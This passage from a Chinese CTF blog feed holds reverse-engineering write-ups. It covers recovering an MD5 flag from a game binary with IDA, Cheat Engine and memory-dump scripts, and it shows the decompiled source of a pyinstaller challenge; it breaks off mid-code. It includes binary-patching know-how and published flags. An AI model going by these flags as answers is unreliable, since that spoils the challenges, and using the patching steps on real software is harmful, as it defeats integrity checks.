src="/p/wpFor-2021MARDASCTF/image-20210331190818301.png"></p><p>我当时还在纳闷为什么是用代码段的数据来计算md5值，原来是为了检测有没有patch啊（</p><p>以及请教队里大佬以后才发现还忽略了一个点，就是md5的update是拼接的，没认真学md5的我一直以为是覆盖的（惭愧，真的要好好学哈希算法。</p><p>编写用来hook的dll文件对我来说还是有点难（tcl），就试着用自己的方法做一下好了。</p><p>（啊其实就是直接静态硬解，从头捋捋怎么发现函数的。</p><p>首先直接findcrypt，找到md5的常数。</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210401004127186.png"></p><p>通过交叉引用找到上一层。</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210401004222831.png"></p><p><img src="/p/wpFor-2021MARDASCTF/image-20210401004350757.png"></p><p>发现这里有一个前面题目提到的花指令，照例nop掉，转函数，看伪代码。</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210401004429125.png"></p><p><img src="/p/wpFor-2021MARDASCTF/image-20210401004614020.png"></p><p>感觉这是个自己写的处理异常的函数（<code>TopLevelExceptionFilter</code>这个名字引起警觉）。</p><p>然后往下看，先根据交叉引用+识别算法给MD5的一系列函数命个名，方便静态分析。</p><p>（也可以盲找<code>AfxMessageBox</code>的交叉引用，毕竟能出flag的地方一般都在MessageBox。）</p><p><del>更何况这题是赛后复盘，根据大家群里零零散散发出来的截图可以判断flag用<code>AfxMessageBox</code>给出，而查AfxMessageBox的交叉引用可以发现就这里是放了变量的。</del></p><p>主要逻辑在：</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210401005119122.png"></p><p><img src="/p/wpFor-2021MARDASCTF/image-20210401005144366.png"></p><p>很明显地看到，v12装着最后的md5（也就是flag。</p><p>整体逻辑是：</p><ol><li>先把<code>IUnknown::operator=()</code>函数首地址开始的12288字节（0x402000-0x405000）放到<code>Src</code>里，然后根据<strong>触发异常时的eax、ebx、ecx、edx的值</strong>修改部分位置（<code>Src[4101]</code>、<code>Src[128]</code>、<code>Src[256]</code>、<code>Src[0x2000]</code>），最后把<code>Src</code>丢进MD5Update里。</li><li>把<code>&amp;loc_404FFE + 2</code>开始的12288字节（0x405000-0x408000）放到<code>Src</code>里，再<code>Src</code>丢进MD5Update里。</li><li>最后算出MD5，此MD5值即为flag。</li></ol><p>庆幸这个MD5算法没有被魔改，不然还得找魔改的地方（瘫。</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210401012909017.png"></p><p><img src="/p/wpFor-2021MARDASCTF/image-20210401012927466.png"></p><p>现在缺的数据就是<strong>触发异常时的eax、ebx、ecx、edx的值</strong>了，只要找到check一切好说，可以从时间的增加入手找到操纵游戏的逻辑部分。</p><p>游戏类果断上CE（Cheat Engine）找关键内存，先绑上运行的exe文件，调整扫描设置后点击“首次扫描”。</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210401010218715.png"></p><p>在界面随便点一下开始游戏（让游戏开始计时），然后调整CE右侧设置，一直点“再次扫描”（注意点击间隔在1s以上，不然时间根本就没动过就扫描不出来了），直到左侧只剩少数地址（并且有一个地址的当前值和计时器的相同）为止。</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210401011044402.png"></p><p><img src="/p/wpFor-2021MARDASCTF/image-20210401011126872.png"></p><p>双击这条地址，选中记录，按<code>F6</code>，查看改写这个地址的位置。</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210401011238839.png"></p><p>可以看到</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210401011300905.png"></p><p>在IDA的反汇编窗口中按<code>g</code>跳到这个地址（<code>0x408803</code>）</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210401011357084.png"></p><p>再反编译可以看到</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210401011416868.png"></p><p>这就是时间增加的函数。</p><p>依次查交叉引用，可以发现check应该存在于这个右键松开的函数里，并且可以猜是<code>sub_403D30()</code>。</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210401011601925.png"></p><p>为什么我笃定是这个呢，因为这个函数不仅是以if框着的形式调用，而且里面还会触发一个异常：</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210401011729507.png"></p><p>也就是我们常说的CC断点</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210401011744842.png"></p><p>这边的逻辑可以猜测是循环check，一旦有不对的地方就直接<code>return 0;</code>，全部通过以后可触发断点，进而走到<code>TopLevelExceptionFilter</code>并给flag。</p><p>而我们需要的正是这里的<strong>eax、ebx、ecx、edx的值</strong>。</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210401012050906.png"></p><p>而观察整个check函数的汇编可以发现，最后是直接用变量给四个寄存器赋值的，并且在之前的代码中这些变量几乎没有变动（具体可以自己琢磨琢磨，看目的寄存器的位置；只可意会不可言传.jpg），所以可以通过把函数开始的<code>jmp     short loc_403D55</code>patch成<code>jmp     short loc_403D9E</code>。</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210401012256792.png"></p><p>这样直接跳过循环来到关键位置<code>loc_403D9E</code>，动态调试时即可在触发int3断点时看到四个寄存器的值。</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210401012453275.png"></p><p>然后开调，老规矩，记得调试之前要把patch的字节保存进exe里（<code>Edit-&gt;Patch program-&gt;Apply patches to input file</code>）。</p><p>选高级以后随便点个右键插旗子，然后放任程序走，走到断点时有提示，关掉提示以后可以看到右上角：</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210401012739096.png"></p><p>四个寄存器的值也拿到了！</p><p>接下来就差内存了。因为前面静态分析的时候我们patch了不少地方（花指令+这波跳转），所以要拿最最开始的附件来dump。</p><p>打开最最开始的附件，选择<code>File-&gt;Script command</code>，分别在IDC下输入以下脚本dump出两块内存：</p><p><img src="/p/wpFor-2021MARDASCTF/image-20210401013416221.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> i,fp;</span><br><span class="line">    fp=fopen(<span class="string">&quot;./dump_0x402000&quot;</span>,<span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="keyword">auto</span> start=<span class="number">0x402000</span>;</span><br><span class="line">    <span class="keyword">auto</span> size=<span class="number">12288</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=start;i&lt;start+size;i++)&#123;</span><br><span class="line">        fputc(Byte(i),fp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> i,fp;</span><br><span class="line">    fp=fopen(<span class="string">&quot;./dump_0x405000&quot;</span>,<span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="keyword">auto</span> start=<span class="number">0x405000</span>;</span><br><span class="line">    <span class="keyword">auto</span> size=<span class="number">12288</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=start;i&lt;start+size;i++)&#123;</span><br><span class="line">        fputc(Byte(i),fp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后编写python3脚本，按照我们最开始分析的逻辑得到flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./dump_0x402000&quot;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    data_0x402000_list=<span class="built_in">list</span>(fp.read())</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./dump_0x405000&quot;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    data_0x405000=fp.read()</span><br><span class="line">eax=<span class="number">0</span></span><br><span class="line">v9=eax//<span class="number">2</span></span><br><span class="line">ebx=<span class="number">0x10</span></span><br><span class="line">ecx=<span class="number">0x1E</span></span><br><span class="line">edx=<span class="number">0x64</span></span><br><span class="line">data_0x402000_list[<span class="number">4101</span>]=ebx</span><br><span class="line">data_0x402000_list[<span class="number">128</span>]=ecx</span><br><span class="line">data_0x402000_list[<span class="number">256</span>]=edx</span><br><span class="line">data_0x402000_list[<span class="number">0x2000</span>]=v9</span><br><span class="line">data_0x402000=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> data_0x402000_list:</span><br><span class="line">    data_0x402000+=b.to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">md5=md5()</span><br><span class="line">md5.update(data_0x402000)</span><br><span class="line">md5.update(data_0x405000)</span><br><span class="line">print(md5.hexdigest())</span><br></pre></td></tr></table></figure><p>flag：<strong>4a468b1a17760d263b0969963e0a6c9b</strong></p>]]></content>
      
      
      <categories>
          
          <category> Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【wp】2021V&amp;NCTF</title>
      <link href="p/wpFor-2021VNCTF/"/>
      <url>p/wpFor-2021VNCTF/</url>
      
        <content type="html"><![CDATA[<p>今天打完的V&amp;NCTF公开赛，做题的时候没记过程，现在来复现一下。</p><p>最后排名Top 18，三道RE+两道杂项（wp没啥可放的hhh）+一道web，感觉re题目还是挺好的，难度适中点赞，尤其pc逆向还是两个算you法xi题，纯模拟好评，算法题不好评（x。</p><a id="more"></a><p><img src="/p/wpFor-2021VNCTF/image-20210314232358706.png"></p><p>比赛地址：<a href="https://buuoj.cn/vnctf_2021">https://buuoj.cn/vnctf_2021</a></p><p>官方wp：<a href="https://mp.weixin.qq.com/s/39XndZUJR-vQetfzkQFVgA">V&amp;NCTF2021 官方WP（RE部分）</a>（其他部分的wp在公众号上自行寻找）</p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="notsudoku"><a href="#notsudoku" class="headerlink" title="notsudoku"></a>notsudoku</h2><p>看到这个名字dna动了一下（之前hsctf新生赛我也出了一个not_a_sudoku的题，还以为这个也是数织，被骗进来做了x），不过这个题目实际上是个魔方阵，读懂源码就很简单了。</p><p>附件图标是典型的pyinstaller打包的exe文件，先参考<a href="https://c10udlnk.top/p/reSkillsOn-Pyinstaller-extracted-to-python/">RE套路 - 关于pyinstaller打包文件的复原 | c10udlnk_Log</a>的方法，pyinstxtractor、补头、改后缀名，然后走到uncompyle6这一步就会报错</p><p><img src="/p/wpFor-2021VNCTF/image-20210315001056338.png"></p><p>第一反应是做了混淆或者在打包的时候做了魔改，于是试了一下解压文件夹里的<code>pyiboot01_bootstrap</code>，发现是能正常走流程反编译的，所以魔改的猜测不成立，只剩下混淆pyc。</p><p>然后去找py打包的原理和各种反混淆的文章看，试图手动去混淆然后用uncompyle6反编译（做了四个小时的原因找到了X_X），然后在某篇文章里看到“……pyc文件随便在网上找个在线工具都可以进行反编译，所以我们要进行加密……”，突然灵光一闪：我为什么不试试在线的反编译工具？</p><p>于是真就被我找到了一个：<a href="http://tools.bugscaner.com/decompyle/">在线pyc,pyo,python,py文件反编译，目前支持python1.5到3.6版本的反编译-在线工具</a></p><p>从而拿到源码（真就只针对uncompyle6做混淆呗）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python 3.7 (3394)</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment"># Compiled at: 1969-12-31 18:00:00</span></span><br><span class="line"><span class="comment">#Powered by BugScaner</span></span><br><span class="line"><span class="comment">#http://tools.bugscaner.com/</span></span><br><span class="line"><span class="comment">#如果觉得不错,请分享给你朋友使用吧!</span></span><br><span class="line"><span class="keyword">import</span> time, sys, hashlib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> あ:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.う = &#123;&#125;</span><br><span class="line">        self.な = []</span><br><span class="line">        self.に = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        self.ぬ = []</span><br><span class="line">        self.ね = <span class="number">65</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> え(<span class="params">self, えひ</span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> の(<span class="params">f</span>):</span></span><br><span class="line">            self.う[えひ] = f</span><br><span class="line">            <span class="keyword">return</span> f</span><br><span class="line">        <span class="keyword">return</span> の</span><br><span class="line">    <span class="function"><span class="keyword">def</span> お(<span class="params">self, は</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.う.get(は)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> か(<span class="params">self</span>):</span></span><br><span class="line">        き = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            く = self.な[き][<span class="number">0</span>]</span><br><span class="line">            け = self.な[き][<span class="number">1</span>]</span><br><span class="line">            こ = self.な[き][<span class="number">2</span>]</span><br><span class="line">            さ = self.お(く)</span><br><span class="line">            さ(け, こ)</span><br><span class="line">            き += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">い = あ()</span><br><span class="line"></span><br><span class="line"><span class="meta">@い.え(u&#x27;\u3057&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">1</span>:</span><br><span class="line">        い.ぬ += b</span><br><span class="line"></span><br><span class="line"><span class="meta">@い.え(u&#x27;\u3059&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">1</span>:</span><br><span class="line">        print(い.に)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> a == <span class="number">2</span>:</span><br><span class="line">            print(い.ぬ)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> a == <span class="number">3</span>:</span><br><span class="line">                print(い.flag, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(a, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@い.え(u&#x27;\u305b&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="meta">@い.え(u&#x27;\u305d&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    い.に = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="meta">@い.え(u&#x27;\u305f&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    time.sleep(a)</span><br><span class="line"></span><br><span class="line"><span class="meta">@い.え(u&#x27;\u3061&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(い.に) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> い.に:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(i) &gt; <span class="number">52</span> <span class="keyword">or</span> <span class="built_in">ord</span>(i) &lt; <span class="number">48</span>:</span><br><span class="line">            sys.exit()</span><br><span class="line">    x = <span class="built_in">str</span>(hashlib.new(<span class="string">&#x27;md5&#x27;</span>, <span class="built_in">bytes</span>(い.に, encoding=<span class="string">&#x27;utf8&#x27;</span>)).hexdigest())</span><br><span class="line">    <span class="keyword">if</span> x[:<span class="number">6</span>] != <span class="string">&#x27;e3a912&#x27;</span>:</span><br><span class="line">        sys.exit()</span><br><span class="line">    い.flag = x</span><br><span class="line"></span><br><span class="line"><span class="meta">@い.え(u&#x27;\u3068&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    ふ = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(い.に), <span class="number">2</span>):</span><br><span class="line">        ふ += <span class="number">1</span></span><br><span class="line">        a = <span class="built_in">int</span>(い.に[i])</span><br><span class="line">        b = <span class="built_in">int</span>(い.に[i + <span class="number">1</span>])</span><br><span class="line">        い.ぬ[a][b] = ふ</span><br><span class="line"></span><br><span class="line"><span class="meta">@い.え(u&#x27;\u3064&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> い.ぬ[<span class="number">0</span>][<span class="number">1</span>] != <span class="number">24</span> <span class="keyword">or</span> い.ぬ[<span class="number">4</span>][<span class="number">3</span>] != <span class="number">2</span>:</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="keyword">if</span> い.ぬ[<span class="number">0</span>][<span class="number">2</span>] != <span class="number">1</span> <span class="keyword">or</span> い.ぬ[<span class="number">2</span>][<span class="number">3</span>] != <span class="number">20</span>:</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="keyword">if</span> い.ぬ[<span class="number">1</span>][<span class="number">0</span>] != <span class="number">23</span> <span class="keyword">or</span> い.ぬ[<span class="number">3</span>][<span class="number">4</span>] != <span class="number">3</span>:</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="meta">@い.え(u&#x27;\u3066&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    ね = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            ね += い.ぬ[a][i]</span><br><span class="line">        <span class="keyword">if</span> ね != い.ね:</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">                ね += い.ぬ[i][b]</span><br><span class="line">            <span class="keyword">if</span> ね != い.ね:</span><br><span class="line">                sys.exit()</span><br><span class="line"></span><br><span class="line">い.な = [</span><br><span class="line"> [<span class="string">u&#x27;\u3059&#x27;</span>, <span class="string">&#x27;welcome baby~ &#x27;</span>, <span class="number">0</span>],</span><br><span class="line"> [<span class="string">u&#x27;\u3059&#x27;</span>, <span class="string">&#x27;input your flag~:&#x27;</span>, <span class="number">0</span>],</span><br><span class="line"> [<span class="string">u&#x27;\u305d&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line"> [<span class="string">u&#x27;\u3059&#x27;</span>, <span class="string">&#x27;your input is:&#x27;</span>, <span class="number">0</span>],</span><br><span class="line"> [<span class="string">u&#x27;\u3059&#x27;</span>, <span class="number">1</span>, <span class="number">0</span>],</span><br><span class="line"> [<span class="string">u&#x27;\u3059&#x27;</span>, <span class="string">&quot;let&#x27;s check......&quot;</span>, <span class="number">0</span>],</span><br><span class="line"> [<span class="string">u&#x27;\u305f&#x27;</span>, <span class="number">0.5</span>, <span class="number">0</span>],</span><br><span class="line"> [<span class="string">u&#x27;\u3057&#x27;</span>, <span class="number">1</span>, [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]]],</span><br><span class="line"> [<span class="string">u&#x27;\u3057&#x27;</span>, <span class="number">1</span>, [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]]],</span><br><span class="line"> [<span class="string">u&#x27;\u3057&#x27;</span>, <span class="number">1</span>, [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]]],</span><br><span class="line"> [<span class="string">u&#x27;\u3057&#x27;</span>, <span class="number">1</span>, [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]]],</span><br><span class="line"> [<span class="string">u&#x27;\u3057&#x27;</span>, <span class="number">1</span>, [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]]],</span><br><span class="line"> [<span class="string">u&#x27;\u3061&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line"> [<span class="string">u&#x27;\u3068&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line"> [<span class="string">u&#x27;\u3064&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line"> [<span class="string">u&#x27;\u3066&#x27;</span>, <span class="number">0</span>, <span class="number">-1</span>],</span><br><span class="line"> [<span class="string">u&#x27;\u3066&#x27;</span>, <span class="number">1</span>, <span class="number">-1</span>],</span><br><span class="line"> [<span class="string">u&#x27;\u3066&#x27;</span>, <span class="number">2</span>, <span class="number">-1</span>],</span><br><span class="line"> [<span class="string">u&#x27;\u3066&#x27;</span>, <span class="number">3</span>, <span class="number">-1</span>],</span><br><span class="line"> [<span class="string">u&#x27;\u3066&#x27;</span>, <span class="number">4</span>, <span class="number">-1</span>],</span><br><span class="line"> [<span class="string">u&#x27;\u3066&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line"> [<span class="string">u&#x27;\u3066&#x27;</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line"> [<span class="string">u&#x27;\u3066&#x27;</span>, <span class="number">0</span>, <span class="number">2</span>],</span><br><span class="line"> [<span class="string">u&#x27;\u3066&#x27;</span>, <span class="number">0</span>, <span class="number">3</span>],</span><br><span class="line"> [<span class="string">u&#x27;\u3066&#x27;</span>, <span class="number">0</span>, <span class="number">4</span>],</span><br><span class="line"> [<span class="string">u&#x27;\u3059&#x27;</span>, <span class="string">&#x27;Goodjob!&#x27;</span>, <span class="number">0</span>],</span><br><span class="line"> [<span class="string">u&#x27;\u3059&#x27;</span>, <span class="string">&#x27;The flag is vnctf&#123;&#x27;</span>, <span class="number">0</span>],</span><br><span class="line"> [<span class="string">u&#x27;\u3059&#x27;</span>, <span class="number">3</span>, <span class="number">0</span>],</span><br><span class="line"> [<span class="string">u&#x27;\u3059&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="number">0</span>],</span><br><span class="line"> [<span class="string">u&#x27;\u305b&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>]]</span><br><span class="line"></span><br><span class="line">い.か()</span><br></pre></td></tr></table></figure><p>源码这个变量名&#x2F;函数名就很离谱，不过比起之前xctf那个pypy的变量名已经算好了（如果变量名看不清，建议各自替换成ida风格或者其他变量名）。</p><p>逻辑很清楚2333，python就算没学到面向对象也能靠猜。</p><p>主要关注这个：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> か(<span class="params">self</span>):</span></span><br><span class="line">    き = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        く = self.な[き][<span class="number">0</span>]</span><br><span class="line">        け = self.な[き][<span class="number">1</span>]</span><br><span class="line">        こ = self.な[き][<span class="number">2</span>]</span><br><span class="line">        さ = self.お(く)</span><br><span class="line">        さ(け, こ)</span><br><span class="line">        き += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>这个的意思就是把源码末尾的二维列表以<code>L[0](L[1],L[2])</code>的方式执行函数。</p><p>对上面的一些比较复杂的函数做一点注释：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 